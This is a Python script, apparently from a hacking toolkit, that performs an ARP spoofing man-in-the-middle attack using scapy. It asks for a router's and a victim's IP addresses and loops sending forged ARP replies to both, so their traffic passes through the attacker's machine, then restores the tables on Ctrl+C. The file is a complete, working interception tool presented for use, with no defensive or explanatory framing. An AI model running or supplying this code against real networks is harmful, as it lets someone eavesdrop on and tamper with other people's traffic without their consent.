#!/usr/bin/python

import scapy.all as scapy
from termcolor import colored, cprint
import os

def execute():
	os.system("clear")
	os.system("figlet -f fire_font-k 'ARP SPOOFER'|lolcat -a -d 1 -F 0.5")
	os.system('echo "\t╔───────────────────────────────────────────────╗" | lolcat -a -d 1')
	os.system('echo "\t|           Created By: Rajnish Kumar           |" | lolcat -a -d 1')
	os.system('echo "\t┖───────────────────────────────────────────────┙\n\n" | lolcat -a -d 1')

def restore(destination_ip, source_ip):
	target_mac = get_target_mac(destination_ip)
	source_mac = get_target_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, verbose=False)

def get_target_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	finalpacket = broadcast/arp_request
	answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
	mac = answer[0][1].hwsrc
	return(mac)

def spoof_arp(target_ip,spoofed_ip):
	mac = get_target_mac(target_ip)
	packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
	scapy.send(packet, verbose=False)

def main():
	execute()
	first_ip = str(input(colored("|> Enter First/Router's IP Address: ","green", attrs=['bold'])))
	mitm_ip = str(input(colored("|> Enter IP Address OF Machine for Spoof ARP Packets: ","green", attrs=['bold'])))
	os.system('echo "\nSTARTING SPOOFING . . ."|lolcat -a -i -d 50 -F 0.5')
	cprint("\n[!] PRECAUTIONS [!]\n=> Until The Is Running, Spoofing Attack Will Be In Process\n=> To Stop The Spoofing kindly press 'CTRL+C'\n=> Don't Press 'CTRL+Z' Otherwise You Will Not Able To Change Spoofed Address Automatically\n=> If You Do Revisit and Rerun The Spoofer & Close With 'CTRL+C' To Restore The Network Configuration","red", attrs=['bold'])
	os.system('echo "\nSPOOFING STARTED . . ."|lolcat -a -i -d 5 -F 0.5')
	try:
		while True:
		#	for i in range(1,255):
			#	spoof_arp("192.168.0."+str(i),"192.168.0.104")
			spoof_arp("{}".format(first_ip),"{}".format(mitm_ip))
			spoof_arp("{}".format(mitm_ip),"{}".format(first_ip))
	except KeyboardInterrupt:
		restore("{}".format(first_ip),"{}".format(mitm_ip))
		restore("{}".format(mitm_ip),"{}".format(first_ip))
		os.system('echo "\n\nSPOOFING STOPPED . . ."|lolcat -a -i -d 1 -F 0.5')
#		exit(0)
		menu()

def menu():
	option = int(input(colored("\n\nDo you want to:\n[1] Spoof Again\n[2] Go Back\n[3] Main Menu\n[4] Exit\n\n|> Select Your Choice: ",'yellow', attrs=['bold'])))
	if option == 1:
		os.system('python3 arpspoofer.py && cd ..')

	elif option == 2:
		os.system('python3 spooferscript.py && cd ..')

	elif option == 3:
		os.system('cd .. && python3 omnitrix.py')

	elif option == 4:
		os.system('echo "Good Bye! Have A Great Day . . ."|lolcat -a -i -d 50 -F 0.5')
		exit()
	else:
		print(colored("\n[!] Error! Select Correct Option","red", attrs=['bold', 'blink']))
		input(colored("\n{|>} Press Key To Continue . . .","green"))
		os.system("clear")
		menu()

main()
